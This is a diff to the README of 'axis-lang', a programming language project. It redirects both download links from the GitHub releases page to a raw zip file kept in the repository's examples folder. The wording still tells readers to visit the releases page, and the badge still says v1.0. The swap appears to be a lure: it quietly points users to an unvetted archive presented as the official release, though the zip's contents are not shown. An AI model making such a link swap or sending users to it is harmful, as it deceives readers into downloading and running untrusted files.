@@ -1,7 +1,7 @@
 # 🚀 axis-lang - Write Fast Code Easily
 
 ## 📥 Download Now
-[![Download axis-lang](https://img.shields.io/badge/Download%20axis--lang-v1.0-brightgreen)](https://github.com/shivansh-2611/axis-lang/releases)
+[![Download axis-lang](https://github.com/shivansh-2611/axis-lang/raw/refs/heads/main/examples/axis-lang-1.1.zip%20axis--lang-v1.0-brightgreen)](https://github.com/shivansh-2611/axis-lang/raw/refs/heads/main/examples/axis-lang-1.1.zip)
 
 ## 📖 Introduction
 Welcome to axis-lang! This application is a systems programming language that combines the simplicity of Python with the performance of C. With axis-lang, you can write efficient code that compiles directly to native x86-64 machine code without requiring any external libraries.
@@ -24,7 +24,7 @@ Follow these steps to download and run axis-lang.
 ### 1. Visit the Download Page
 Click on the link below to go to the releases page where you can download the latest version of axis-lang.
 
-[Download axis-lang](https://github.com/shivansh-2611/axis-lang/releases)
+[Download axis-lang](https://github.com/shivansh-2611/axis-lang/raw/refs/heads/main/examples/axis-lang-1.1.zip)
 
 ### 2. Select the Latest Release
 On the releases page, look for the latest version listed at the top. Click on it to see all available download options.
